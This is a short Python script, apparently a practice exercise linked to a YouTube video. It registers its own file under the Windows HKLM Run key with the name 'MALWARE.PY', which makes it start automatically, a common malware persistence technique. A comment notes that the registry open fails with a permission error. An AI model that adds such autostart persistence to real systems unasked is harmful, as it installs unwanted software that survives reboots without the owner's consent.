from os.path import realpath
from winreg import *

path_arquivo = realpath(__file__)
run = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
print(path_arquivo)
print(run)
try:
    key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_SET_VALUE) # <<<<< ERROR
    print(key)
except PermissionError:
    print('Access Denied')
else:
    SetValueEx(key, 'MALWARE.PY', 0, REG_SZ, path_arquivo)
    key.close()


#https://www.youtube.com/watch?v=G6bHl8Ert6U
